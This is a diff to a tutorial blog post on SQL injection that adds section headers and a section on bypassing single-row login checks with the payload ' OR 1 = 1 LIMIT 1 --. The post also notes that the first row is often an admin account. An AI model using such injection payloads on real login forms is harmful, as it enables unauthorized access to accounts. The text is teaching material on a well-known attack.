@@ -4,6 +4,8 @@ title: "SQL Injection Tutorial"
 date: 2016-04-15
 ---
 
+### What is SQL?
+
 SQL stands for **S**tructrued **Q**uery **L**anguage.
 
 Some properties of SQL are:
@@ -28,6 +30,8 @@ Lots and lots of large products use SQL:
 4. Oracle
 5. Microsoft
 6. A lot... of websites...
+
+### How do you use SQL?
 
 As a demonstration, we can use Python's SQLite3 library as a quick demonstration:
 
@@ -90,6 +94,8 @@ the users in the database who have the username that matches what the user
 input. ... *But*... What if an evil person doesn't know a username, and wants
 this query to return true? Or maybe he just wants all the usernames?
 
+### Our first injection
+
 <div class="codeblock">
 <code>
 SELECT * FROM users WHERE uname='$uname';
@@ -125,4 +131,77 @@ SELECT * FROM users;
 <br>
 </code>
 </div>
+
+As you can see, the simple query to match up an input username is turned into a
+query to return all the rows in the database!
+
+### But we have some limits...
+
+Many login systems will restrict the number of returned rows to exactly 1 in
+order to successfully log in, or display info. Clearly, it is bad practice as a
+developer to just use:
+
+<div class="codeblock">
+<code>
+if query.rows == 0:
+<br>
+    return False # Bad login
+<br>
+renderData() # Otherwise successful login!
+<br>
+</code>
+</div>
+
+(The above is just pseudo-code, that's not actually how you check the number of
+returned rows.) Instead what most programs will mimic is something like this:
+
+<div class="codeblock">
+<code>
+if query.rows != 1:
+<br>
+    return False # Bad login
+<br>
+renderData() # Otherwise successful login!
+<br>
+</code>
+</div>
+
+So how do we bypass this? Our first injection won't work unless there's exactly
+one row in the database, and for most databases, that's simply not the case.
+
+**The solution**: We can take advantage of the `LIMIT` keyword in SQL. In SQL,
+the `LIMIT` keyword is a lot like the `head` command in Bash: it simply returns
+the first `n` rows of a query. For example:
+
+```
+SELECT * FROM fruits WHERE type="apple" AND color="green" LIMIT 5;
+```
+
+This query selects the first 5 rows in `fruits` where the type of fruit is
+"apple" and the color is "green".
+
+We can use this in our injection:
+
+<div class="codeblock">
+<code>
+SELECT * FROM users WHERE uname='$uname';
+<br>
+$uname = “' OR 1 = 1 LIMIT 1 -- ”;
+<br>
+SELECT * FROM users WHERE uname='' OR 1 = 1 LIMIT 1 -- ';
+<br>
+SELECT * FROM users WHERE uname='' OR 1 = 1 LIMIT 1;
+<br>
+SELECT * FROM users WHERE false OR true LIMIT 1;
+<br>
+SELECT * FROM users WHERE true LIMIT 1;
+<br>
+SELECT * FROM users LIMIT 1;
+<br>
+</code>
+</div>
+
+This will select the *first* row of the database. (**Tip**: Usually the first
+row of the database is an admin user or some dummy user that a developer used
+during testing and didn't want to / forgot to remove.
 
